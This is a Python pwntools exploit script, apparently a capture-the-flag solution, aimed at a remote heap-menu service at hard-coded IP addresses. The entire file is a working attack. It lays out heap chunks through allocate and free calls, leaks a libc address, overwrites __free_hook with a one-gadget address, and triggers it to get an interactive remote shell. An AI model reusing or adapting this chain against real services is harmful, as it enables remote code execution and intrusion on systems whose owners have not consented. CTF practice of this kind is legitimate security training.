#!/usr/bin/env python

# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.19"
#host = "52.68.236.186"
#port = 56746
host = "54.178.132.125"
port = 8763

r = remote(host,port)


def allocate(size,data):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil("e:")
    r.sendline(str(size))
    r.recvuntil("a:")
    r.send(data)

def show(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil("x:")
    r.sendline(str(idx))

def free(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil("x:")
    r.sendline(str(idx))

for i in range(6):
    allocate(0x80,"a")

allocate(0x38,"a") #6
allocate(0x4e0+0x490,"b") #7
allocate(0x410,"c") #8
allocate(0x80,"d") #9
free(7)
free(6)
allocate(0x68,"c"*0x68) #6
allocate(0x80,"d"*0x78) #7
free(5)
allocate(0x60,"da") #5
for i in range(5) :
    free(i)
free(9)
free(7)
free(8)
allocate(0x90,"ccc")
allocate(0x7f0-0xa0,"d")
allocate(0x50,"d")
free(5)
allocate(0x30,"a")
allocate(0x60,"a")
allocate(0x20,"gg")
show(4)
libc = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00")) - 0x3ebca0
print hex(libc)
free_hook = libc + 0x3ed8e8
free(0)
allocate(0xa0,"b"*0x70 + p64(free_hook))

allocate(0x90,"b")
magic = libc  +0x4f322
allocate(0x90,p64(magic))

free(5)
r.interactive()


